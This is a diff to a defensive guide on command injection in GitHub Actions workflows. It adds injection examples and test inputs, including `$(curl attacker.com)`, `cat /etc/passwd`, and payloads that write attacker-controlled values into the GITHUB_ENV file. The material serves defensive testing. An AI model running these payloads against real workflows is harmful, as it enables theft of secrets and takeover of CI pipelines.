@@ -4,6 +4,26 @@ render_with_liquid: false
 
 # GitHub Actions Security: Echo Command Injection Prevention
 
+> **Document status**
+>
+> - **Last reviewed:** 2026-05-19
+> - **Authorship:** Drafted with AI assistance (GitHub Copilot, multi-model review) and reviewed by a human maintainer before publication.
+> - **Sources:** Based on public documentation — primarily [docs.github.com](https://docs.github.com), [learn.microsoft.com](https://learn.microsoft.com), and official vendor blogs cited inline.
+> - **Verify before acting:** GitHub and Microsoft update product documentation continuously. Re-confirm against the live source pages before relying on this content for production decisions.
+
+## Table of Contents
+
+1. [Overview](#overview)
+2. [The Vulnerability](#the-vulnerability)
+3. [User-Controlled Inputs to Watch](#user-controlled-inputs-to-watch)
+4. [Protection Methods](#protection-methods)
+5. [Real-World Examples Fixed](#real-world-examples-fixed)
+6. [Branch Name Protection](#branch-name-protection)
+7. [Additional Security Best Practices](#additional-security-best-practices)
+8. [Testing for Vulnerabilities](#testing-for-vulnerabilities)
+9. [References](#references)
+10. [Quick Reference Card](#quick-reference-card)
+
 ## Overview
 
 This document explains the **echo command injection vulnerability** (HackerBot Claw attack) and how to protect your GitHub Actions workflows.
@@ -44,9 +64,17 @@ Result: Exfiltrates secrets to attacker's server
 ```
 
 **Example 2: Workflow Command Injection**
+
+**Note:** The `::set-output` stdout workflow command was deprecated in October 2022 and emits warnings on modern runners. The current dominant injection vector in GitHub Actions targets the **`GITHUB_ENV`** and **`GITHUB_OUTPUT`** environment files — see the additional example below.
+
 ```
 Input: $(echo "::set-output name=token::$GITHUB_TOKEN")
 Result: Leaks secrets through workflow commands
+```
+
+```
+Input: $(echo -e "\nINJECTED_VAR=evil_value\n" >> $GITHUB_ENV)
+Result: Injects an environment variable into subsequent workflow steps, enabling secret exfiltration.
 ```
 
 **Example 3: Branch Name Attack**
@@ -306,6 +334,7 @@ Use these test inputs to verify your workflows are secure:
 $(whoami)
 `cat /etc/passwd`
 "\n::set-output name=test::value\n"
+"\nINJECTED_VAR=$(cat /etc/passwd)\n"  # targets GITHUB_ENV file injection
 $(curl attacker.com)
 ```
 
@@ -315,7 +344,7 @@ If any of these execute commands or show sensitive data, your workflow is vulner
 
 - [StepSecurity: HackerBot Claw GitHub Actions Exploitation](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)
 - [GitHub: Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
-- [GitHub: Understanding the risk of script injections](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)
+- [GitHub: Understanding the risk of script injections](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#good-practices-for-mitigating-script-injection-attacks)
 
 ## Quick Reference Card
 
